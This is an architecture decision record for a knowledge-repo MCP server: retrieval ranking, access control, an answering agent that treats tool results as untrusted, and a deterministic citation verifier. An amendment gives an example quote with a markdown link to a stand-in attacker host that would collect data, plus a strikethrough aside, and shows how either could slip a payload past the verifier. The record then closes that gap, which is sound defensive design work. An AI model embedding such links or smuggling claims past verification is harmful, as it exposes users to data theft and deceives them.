# ADR 007 — Own the answer path: contract enforcement moves server-side

**Status:** accepted · 2026-07-13 · realized by [ADR 012](./012-hybrid-index.md) (the index) and
by the MCP server that consumes it.

## Context

The page contract told MCP clients how to behave — "don't quote numbers from failed pages",
"prefer the superseding version", "open the original when detail lives in the source" — but
nothing enforced it. The serving half was delegated to an external engine with none of the
pipeline's guarantees and no way to add them there. The product's promise is decided at answer
time; that was the one place the doctrine didn't reach.

## Decision

A first-party serving package that enforces the contract **server-side**, structured like the
write side — deterministic where trust matters, agentic where judgment pays:

- **Index & retrieval (pure code).** A regenerable derived index over the knowledge repo.
  Ranking is a base relevance plus *explainable, deterministic* contract factors: superseded
  pages heavily demoted, exact entity/period matches boosted, fresh `as_of` preferred for
  "current"-style questions. Every hit carries the factors applied to it — "why did this rank
  here" is always answerable.
- **Exact numbers (pure code).** A `query_metrics` tool resolved figures out of a fact store and
  flagged rows whose page was superseded, so current truth won conflicts. Both the store and the
  tool were removed later ([ADR 026](./026-the-purge.md)): the reader's protection is the
  verbatim source one click away plus the answer-time verifier below, not a second numeric
  substrate to keep in step with the pages.
- **The answering agent (judgment).** Bounded tools (search / read_page / describe_entity, all
  results fenced as untrusted data), instructed to cite everything and to *refuse* when the
  evidence is insufficient — refusal is a first-class outcome, not a failure.
- **The answer verifier (pure code, the judge).** Before an answer leaves the server: every
  figure must trace to what the tools returned **this run** (a lucky match elsewhere cannot
  launder an invented number), every citation must point at a surfaced page and quote it
  verbatim. `failed` earns exactly one corrective retry; the verdict ships with the answer.
- **Thin MCP skin.** stdio for local clients; the contract enforcement lives in the service,
  never in the transport.

**Access control is server-side too** ([ADR 010](./010-acl.md)): pages carry `acl:` audience
labels, and a view carries the intersection of its members'. The service filters **everything**
through the client's scope — out-of-scope pages don't appear in search, can't be read, and even
discovery hints are scoped. Unlabeled content stays open; an unrestricted client sees everything.

## How it is realized here

The design was ported from a serving layer that was one package with its own SQLite/FTS5 index
and BM25 base relevance. Here it is split across the index and the server, and the same index
serves both:

- **The index is the hybrid one** ([ADR 012](./012-hybrid-index.md)): Postgres + pgvector, an FTS
  arm and a semantic arm fused with RRF, then the *same* explainable contract factors this ADR
  describes (`stigmergy.index.rank`). The server consumes it as a library; there is no private
  serving index and no per-call refresh — every read hits Postgres live.
- **The read path** is `search_brain` and `read_page`, with ACL enforcement wired from the first
  call: this is where "one MCP server is the only API" first has a body.
- **The answering agent and the deterministic answer verifier** mount on that same service. The
  service layer exposes the read primitives as callable methods precisely so the agent can gather
  evidence without a second retrieval path.

## Consequences

- "Trust the pages" becomes "trust the answers": the machine-checkable verdict that gates pages
  rides on every answer (`verdict` in the `ask` response — see
  [answer.md](../reference/answer.md)).
- Offline determinism: the fake embedder answers the retrieval path with zero keys, so demos and
  CI run the whole serving path keyless.
- One enforcement point: access control and superseded-awareness live in the service, so no
  client re-implements them and none can drift.

## Amendment — 2026-08-04: a citation is checked as a READER sees the page (issue #39)

The original ruling checked a citation quote against the page's raw bytes, whitespace- and
case-normalized. That was correct until the corpus filled with inline emphasis — the page
contract's own templates use `**bold**` labels and the librarian writes them by house style — at
which point the agent, which quotes a page as a reader sees it, produced TRUE citations that the
verifier could not confirm. The same question came back `verified` on one run and `partial` on the
next.

The failure mode that made this worth a ruling rather than a patch: `partial` means "something here
could not be verified". Fired constantly for cosmetic reasons, it is a signal an operator learns to
skip — and a real verification failure then hides inside the noise. A permanently-yellow verdict is
this repo's permanently-green test wearing the other colour.

**The ruling**: both sides of the containment check consume MATCHED marker pairs — emphasis/strong,
inline code, both wikilink and inline-link forms — with `_` and a lone `*` gated on word
boundaries.
Nothing else. Digits are never touched, the only punctuation removed is a matched delimiter, and a
word boundary collapses only where a renderer collapses it too.

**Two boundaries, both load-bearing, both pinned as adversarial twins:**

- **Unmatched delimiters are not stripped.** Deleting the characters wherever they appear would let
  a page saying `MAX_RETRIES = 3` verify a quote saying `MAXRETRIES = 3`, and — worse — would erase
  a page's own footnote asterisk, letting an answer shed the caveat the page attached to a figure.
  That class is reachable by an honest model, not only by a crafted page: snake_case identifiers,
  globs and paths are ordinary content here.
- **A struck span is dropped whole, not unwrapped.** `~~12%~~ 14%` is the page RETRACTING a value.
  Keeping the content would make a superseded figure quotable as current, and `unverified_figures`
  is no backstop because the struck number genuinely is in the evidence text. It is the one member
  of the set where "what a reader sees" and "what the page asserts" diverge.

**Rejected**: instructing the agent to quote raw bytes including the markers. Models normalize prose
by nature, so that moves the flakiness into the prompt instead of removing it.

**Further amendment — 2026-08-05: the two sides are not symmetric, and that asymmetry is itself a
security property.** "Both sides… nothing else" above was the whole rule for exactly as long as
nobody asked what a MODEL-authored quote could smuggle through it. A PAGE's markers are given — the
corpus contains them and a reader never sees them, so consuming all of them, link forms and the
struck span included, is reader-equivalence. A QUOTE's markers are ASSERTED BY THE MODEL, and a
link form or a struck span there carries a PAYLOAD that consuming it deletes from the claim before
the claim is checked:

    page:  "See the policy for details."
    quote: "See [the policy](https://attacker.example/collect?d=…) for details."   -> verified

The shipped citation carries the RAW quote, so a markdown-rendering client shows a clickable
attacker-chosen destination inside the one element this system calls a citation you can check —
the direction none of the original ruling's adversarial twins tested (all of them removed a marker
from the quote; none added one). A struck span in the quote is the same shape: `"Margin was
~~and the CEO resigned over fraud~~ 14%."` verified under the symmetric rule, because the aside
vanished from both sides before the comparison ran. So: emphasis, strong and inline code stay
symmetric — they carry no payload, `**A**` asserts nothing `A` does not — while link forms and the
struck span are now consumed on the PAGE side only. A quote written with a link, a wikilink or a
strikethrough must match a page that really contains it, character for character.

## Alternatives rejected

- **Contributing enforcement to the external engine** — different stack; the trust layer is this
  repo's core competence and must live where its contracts do.
- **Prompt-only enforcement** (system prompts on clients) — hope is not a guarantee; clients
  vary and drift.
- **A second, serving-only index** — the hybrid index already carries the filter and ACL columns,
  so the server reuses it rather than growing a parallel store to keep in sync.
